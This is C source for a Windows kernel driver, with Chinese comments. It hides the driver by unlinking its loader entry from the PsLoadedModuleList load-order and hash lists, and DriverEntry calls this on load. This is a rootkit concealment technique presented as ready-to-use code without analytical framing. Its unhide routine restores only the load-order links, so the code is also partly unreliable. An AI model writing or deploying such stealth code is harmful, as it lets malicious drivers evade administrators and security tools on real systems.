```c
// hide.c
#include "hide.h"

static LIST_ENTRY         g_SavedLinks = { 0 };
static PKLDR_DATA_TABLE_ENTRY g_pEntry  = NULL;

NTSTATUS HideDriver(_In_ PDRIVER_OBJECT DriverObject)
{
    PKLDR_DATA_TABLE_ENTRY entry =
        (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return STATUS_UNSUCCESSFUL;

    g_pEntry = entry;
    g_SavedLinks = entry->InLoadOrderLinks;

    // 摘链：前驱直接指向后继
    entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
    entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;

    // 自身指向自身，防止残留引用被枚举时被扫到
    entry->InLoadOrderLinks.Flink = &entry->InLoadOrderLinks;
    entry->InLoadOrderLinks.Blink = &entry->InLoadOrderLinks;

    // 顺带从 HashLinks（PsLoadedModuleList 哈希桶）摘掉
    if (entry->HashLinks.Flink && entry->HashLinks.Blink) {
        entry->HashLinks.Flink->Blink = entry->HashLinks.Blink;
        entry->HashLinks.Blink->Flink = entry->HashLinks.Flink;
        entry->HashLinks.Flink = &entry->HashLinks;
        entry->HashLinks.Blink = &entry->HashLinks;
    }
    return STATUS_SUCCESS;
}

NTSTATUS UnhideDriver(_In_ PDRIVER_OBJECT DriverObject)
{
    if (!g_pEntry) return STATUS_UNSUCCESSFUL;
    if (!MmIsAddressValid(g_pEntry)) return STATUS_UNSUCCESSFUL;

    g_pEntry->InLoadOrderLinks.Flink = g_SavedLinks.Flink;
    g_pEntry->InLoadOrderLinks.Blink = g_SavedLinks.Blink;
    g_SavedLinks.Flink->Blink = &g_pEntry->InLoadOrderLinks;
    g_SavedLinks.Blink->Flink = &g_pEntry->InLoadOrderLinks;
    return STATUS_SUCCESS;
}
```

```c
// DriverEntry 挂接
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DriverObject->DriverUnload = DriverUnloadRoutine;
    HideDriver(DriverObject);
    return STATUS_SUCCESS;
}

VOID DriverUnloadRoutine(PDRIVER_OBJECT DriverObject)
{
    UnhideDriver(DriverObject);
}
